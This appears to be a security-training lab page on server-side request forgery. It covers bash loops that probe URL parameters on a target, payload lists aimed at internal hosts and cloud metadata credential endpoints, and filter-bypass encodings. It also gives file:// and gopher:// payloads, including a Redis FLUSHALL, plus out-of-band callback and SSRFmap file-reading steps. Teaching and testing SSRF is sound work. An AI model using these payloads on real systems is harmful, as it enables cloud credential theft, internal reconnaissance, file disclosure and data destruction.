---
title: A10 — SSRF (Server-Side Request Forgery)
sidebar_position: 9
tags: [lab, owasp-a10, ssrf, cloud]
---

# A10 — SSRF (Server-Side Request Forgery)

## What this lab covers

- SSRF parameter discovery — identifying parameters that accept URLs
- Internal network probing — localhost, private IPs, cloud metadata endpoints
- Filter bypass payloads — encoding tricks to evade SSRF protections
- Out-of-band (OOB) detection — confirming blind SSRF via DNS callbacks

## Configuration

```bash
TARGET="http://TARGET_IP_OR_DOMAIN"
PORT="80"
```

## Exercise 1: SSRF Parameter Discovery

Probe common parameter names that typically accept URLs or resource paths:

```bash
SSRF_PARAMS=(
  url uri link src source path dest redirect target
  fetch load resource proxy callback webhook endpoint
  import download host from to image preview imageUrl
  file ref
)

TEST_URL="http://127.0.0.1"

for PARAM in "${SSRF_PARAMS[@]}"; do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" \
    "$TARGET/api/fetch?$PARAM=$TEST_URL")
  echo "$PARAM: $RESPONSE"
done
```

Also test common SSRF-prone endpoints directly:

```bash
ENDPOINTS=(
  "/api/fetch?url="
  "/preview?link="
  "/image?src="
  "/proxy?target="
)

for ENDPOINT in "${ENDPOINTS[@]}"; do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$ENDPOINT$TEST_URL")
  echo "$ENDPOINT: HTTP $RESPONSE"
done
```

## Exercise 2: Internal Payload Library

### Localhost variants

```bash
LOCALHOST_PAYLOADS=(
  "http://127.0.0.1/"
  "http://localhost/"
  "http://[::1]/"
  "http://0.0.0.0/"
)
```

### Private network ranges

```bash
INTERNAL_PAYLOADS=(
  "http://192.168.1.1/"
  "http://10.0.0.1/"
  "http://172.16.0.1/"
)
```

### Cloud metadata endpoints

```bash
# AWS EC2 Instance Metadata Service (IMDSv1)
"http://169.254.169.254/latest/meta-data/"

# AWS — retrieve IAM role credentials (high impact)
"http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# GCP — requires Metadata-Flavor header (may be blocked)
"http://metadata.google.internal/computeMetadata/v1/"

# Azure IMDS
"http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### Internal service probing

```bash
INTERNAL_SERVICES=(
  "http://127.0.0.1:6379/"    # Redis
  "http://127.0.0.1:5432/"    # PostgreSQL
  "http://127.0.0.1:27017/"   # MongoDB
  "http://127.0.0.1:9200/"    # Elasticsearch
  "http://127.0.0.1:2375/"    # Docker daemon (unauthenticated API)
  "http://127.0.0.1:8080/"    # Common internal HTTP
  "http://127.0.0.1:8443/"    # Common internal HTTPS
)
```

## Exercise 3: Filter Bypass Payloads

When naive blocklist filters block `127.0.0.1` or `localhost`, try these alternatives:

### IP encoding variants (all resolve to 127.0.0.1)

| Encoding | Value |
|----------|-------|
| Decimal | `http://2130706433/` |
| Hexadecimal | `http://0x7f000001/` |
| Octal | `http://0177.0.0.1/` |
| Shortened | `http://127.1/` |
| IPv6 mapped | `http://[::ffff:127.0.0.1]/` |
| Unicode dots | `http://127。0。0。1/` |

### DNS-based bypasses

```bash
# nip.io — resolves *.127.0.0.1.nip.io to 127.0.0.1
"http://127.0.0.1.nip.io/"

# localtest.me — resolves to 127.0.0.1
"http://localtest.me/"

# Own a domain and point it to 127.0.0.1
"http://ssrf.yourdomain.com/"
```

### URL scheme bypasses

```bash
# file:// — read local files directly
"file:///etc/passwd"

# dict:// — interact with services speaking dict protocol
"dict://127.0.0.1:6379/INFO"

# gopher:// — send raw TCP data (Redis, Memcached, SMTP)
"gopher://127.0.0.1:6379/_FLUSHALL"
```

## Exercise 4: OOB Detection (Blind SSRF)

When the SSRF response doesn't reflect content, use out-of-band DNS callbacks to confirm the vulnerability.

### interactsh (Burp Collaborator alternative)

```bash
# Install
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Start a listener — generates a unique callback URL
interactsh-client

# Use the generated URL as the SSRF payload
curl -s "$TARGET/api/fetch?url=http://YOUR_UNIQUE_ID.oast.pro/"

# interactsh-client will show DNS/HTTP callbacks if the server made a request
```

### SSRFmap (automated exploitation)

```bash
git clone https://github.com/swisskyrepo/SSRFmap.git /opt/SSRFmap
cd /opt/SSRFmap
pip3 install -r requirements.txt

python3 ssrfmap.py -r request.txt -p url -m readfiles
```

`request.txt` is a saved HTTP request (e.g. from Burp) with the SSRF parameter marked.
